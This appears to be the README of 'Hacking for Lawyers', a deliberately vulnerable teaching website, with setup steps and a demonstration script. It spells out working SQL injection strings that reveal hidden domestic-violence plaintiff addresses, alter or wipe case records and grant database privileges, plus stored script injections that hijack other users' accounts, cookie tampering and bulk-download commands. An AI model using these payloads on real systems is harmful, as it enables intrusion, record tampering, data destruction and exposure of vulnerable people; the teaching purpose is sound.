# Hacking for Lawyers

## Running the Site
The website is in docker and uses the mattrayner lamp stack. Run the code below to launch the site 
```
docker-compose build
```
If you don't want to have a permanent mysql db outside the container then get rid of the second -v tag.
```
docker-compose up -d
```
There is a shell script in the app folder called create_sql.sh. This will drop the websitedata table if it exists and reinstall from a sql file in the mysql_tables folder in app.
```
docker exec -it hacking4lawyers-webapp-1 bash
cd app_backend
bash create_sql.sh 
```
Create a new mysql user from commandline.
```
mysql -u root -p
CREATE USER 'my_user_name'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'my_user_name';
FLUSH PRIVILEGES;
```

Install SSL Cert
```
certbot --apache
```
Type in the names of your domain hacking4lawyers.com www.hacking4lawyers.com
Click the second option to select the new ssl conf file and then click 2 to redirect to https.
You may not want to redirect to https if you want to show how network traffic can be intercepted.

# Topics Covered
## Case Search Page

### Case Search Form Field Manipulation

Although the dropdown on the case search page only has the options of 5 or 10 results. 
You can use inspect on chrome to modify the value of the dropdown to be any number.

### Case Search SQL Injection Queries

Updated SQL Queries

Case Search to retrieve an expunged case.
```
12C934924' -- 
```
Last name search to retrieve all expunged cases.
```
John' or Expunged = True-- 
```
Reveal Judge's name or Plaintiff's Address in DV cases
```
fakecasenumber'
UNION
SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT('Plaintiffs Address: ',Plaintiff_Address) as Case_Description,Judge, Expunged
FROM casedata WHERE Case_Number = '12C934902' -- 

fakecasenumber'
UNION
SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT('Judge: ',Judge) as Case_Description,Judge, Expunged
FROM casedata WHERE Case_Number = '12C934902' -- 
```
Update a single defendant's name
```
12C934911'; UPDATE casedata SET Defendant_Name = 'John Smith' WHERE Case_Number = '12C934911'-- 
```
Encrypt all data in a single column.
```
12C934911'; UPDATE casedata SET Defendant_Name = AES_ENCRYPT(Defendant_Name,'password') -- 
```

Old Queries
```
Type this into the case number search box. It can also be typed into the url as a get parameter.
Step 0: Check to see if SQL Injection works at all.
fakecasenumber' OR '1' = '1

Step 1: Find the custom schema and return as the case number by continually adding 'test' as test until the columns match up.
fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(schema_name)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.schemata WHERE '1'='1

Step 2: Get all the table names from that custom schema.
fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(TABLE_NAME)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.TABLES WHERE table_schema ='websitedata

Step 3: Get all the column names from that table
fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(COLUMN_NAME)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME ='casedata

Step 4: Now that we have all the column names for case data we can return different items. We notice the number of columns is also the number needed for the select statement so we assume they are using an *
We also notice a column that is not displayed anywhere called "Judge". We can replace case description with Judge to print out who the Judge will be.
fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT("Judge:", Judge) as Case_Description,'test' From casedata WHERE Case_Number = '12C934902

Step 5: We notice on domestic violence cases the plaintiff addres isn't shown. Using the same trick as before we can show the plaintiff address as case description
fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT("Plaintiffs Address: ",Plaintiff_Address) as Case_Description,Judge From casedata WHERE Case_Number = '12C934902

Or we could change the case type to something other than DV to trick the code that looks for DV cases.

fakecasenumber' UNION ALL SELECT Case_Number,"Criminal" as Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,Case_Description,Judge From casedata WHERE Case_Number = '12C934902

Step 6: We test to see if it will let us run multiple queries. If the permissions aren't set right we can update or delte out information.
//Resets the hearing date for a month earlier.
fakecasenumber'; UPDATE casedata SET Hearing_Date = '10/25/2019' WHERE Case_Number = '12C934910

Step 7: We can update the defendants name to something else
//Updates the defendants name in a criminal case
fakecasenumber'; UPDATE casedata SET Defendant_Name = 'John Smith' WHERE Case_Number = '12C934910

Step 8: We can wipe out all the data using truncate.
//Please don't do during a live demo!
fakecasenumber'; TRUNCATE casedata; SELECT * FROM casedata WHERE Case_Number = '12C9349010

Step 9: Finally we can create a new user so we can simply login ourselves to more directly control the mysql server.
fakecasenumber'; GRANT ALL PRIVILEGES ON *.* TO 'hackerman'@'localhost' IDENTIFIED BY 'password
```

## Blog Post Site

### Cookie Poisoning
When the user logs in a cookie is set with the users username. This can be modified to be any user, thus becoming that user.

### SQL Injection

This can be done through modifying the username in the cookie

Test if sql injection works
```
mstubenberg' OR '1' = '1
```
Get password for user
```
fakeuser' UNION ALL SELECT "test" as test,password FROM users WHERE username = 'attorney1
```
Get all the users information using ID
```
fakeuser' UNION ALL SELECT username,password FROM users WHERE ID = '2
```

### Bypass JavaScript input validation

On the user registration page, when the user clicks "Create," an error
message will appear if the username field is empty, if the password is
empty, or if the e-mail address is not a valid e-mail address.

If the user uses "Inspect" to look at the "Create" button, he or she
will see that there is an "event" attached to the button, and the
button has the id `create`.  The user can also see from the page
source that the site uses JQuery.

To get around client-side input validation, enter the following into
the JavaScript Console.

```
$("#create").off();
```

Then click the "Create" button.

### JavaScript Injection

You can add javascript directly into the text box for a post which is
then executed by the users browser.

Testing if it's possible
```
<script>
console.log("It worked!");
</script>
```

Script to change the password of the user and then log them out unless they are the user "hackerman"
Note: This one should be dropped as an example because it then prohibits any of the audience from playing with the site.
```
    <script>
       setTimeout(function(){
           console.log("It worked");
           if($("#accountinfousername").text() != "hackerman"){
                if($("#logoutbutton").length > 0 && $("#resetpasswordsuccess").length == 0){
                    $("#resetpassword").val("pa$$word");
                    $("#resetpasswordbutton").click();
                }else if($("#resetpasswordsuccess").length > 0){
                    $("#logoutbutton").click();
                }else{
                    console.log("Waiting for user to login");
                }
            }

        },1000); 
    </script>
```

Makes every user post a blog post about how great Matthew Stubenberg is. This verison has a timer so we can see the post before it's clicked.
```
<script>
$(document).ready(function() {
	
    var usernameFromP = $("#accountinfousername").text().trim();
    if ($("." + usernameFromP).length == 0) {
		console.log("User has not posted about me yet");
        $("#blogpost").val("Matthew Stubenberg is one of the greatest attorneys out there." + `<span class="${usernameFromP}"></span>`);
        $("#blogtitle").val("Matthew Stubenberg Best Attorney");
        setTimeout(function(){
			$("#submitpostbutton").click();
		},10000);
    } else {
        console.log("User has already posted");
    }
	
});
</script>
```

## Cracking Passwords 
This is all on the pass_cracker folder.

### Encrypting passwords

`passwords.txt` has a list of passwords that people might use. (well, hopefully not, because they're extra weak for demonstration purposes)

Use `hash.sh` to encrypt passwords with the (very insecure, so only for demo purposes) md5 algorithm. 

```./hash.sh```

The new `secrets.md5` file is the hashed version of the passwords. 

### Decrypting them

Run `./dehash.sh`. 

This compares the hashes of the words in `wordlist.txt` to the hashes in `secrets.md5`. 

If `hashcat` can find a word in `wordlist.txt` with a hash that matches one in `secrets.md5`, it knows that hash came from the word in the wordlist.

## Classified Portal Page
This one is located at /blog/classified_portal.php and is designed to demonstrate how Chelsea Manning used wget to login and download Classified PDFs.
The page with all the documents is also left exposed if you go directly to the URL at https://hacking4lawyers.com/blog/classified_documents/.

Download a single document
```
wget --post-data "username=testuser&password=password" http://localhost/blog/classified_documents/CLASSIFIED%20DOCUMENT%201.pdf
```
Download all documents
```
wget -r -nd -l1 -A "*.pdf" --post-data "username=testuser&password=password" http://localhost/blog/classified_portal.php
```

## Article Paywall
The article at https://hacking4lawyers.com/blog/article.php is set to throw up a login paywall after 3 seconds. You can bypass it by switching your user-agent to "Google Bot" or by usign javascript to disable the modal. Discussion should be around DMCA and whether our technique bypasses a technological measure and what the copyrighted material is.

## Event Page
Change the user-agent to view the page. This can be done by chrome extension or chrome developer tools. Discuss if this is a CFAA or DMCA violation.

In order to be more helpful the form autopopulates if there is an ID in the URL as a GET parameter. This can be used to pull PII out of the db. This replicates the AT&T hack. blog/event.php?ID=1

## To Do:
1. I think the blog site should have additional options if the user is "admin". Then using the cookie trick you can log in as admin and delete posts.
2. I think real world examples of each of these would be useful. Show an example then show a news clip of a company that actually had this vulnerability.
3. I'd like to demonstrate a man in the middle attack. Maybe brining our own wireless network? 
4. Showing a password cracker live in the background somehow that we start at the beginning and check how many we've cracked at the end would be cool.
5. Add a privacy policy.
6. Make the bypass javascript validation more interersting.
7. Add the ability to see the two prime numbers and final number multiplied together for RSA encryption on the passwords.php page.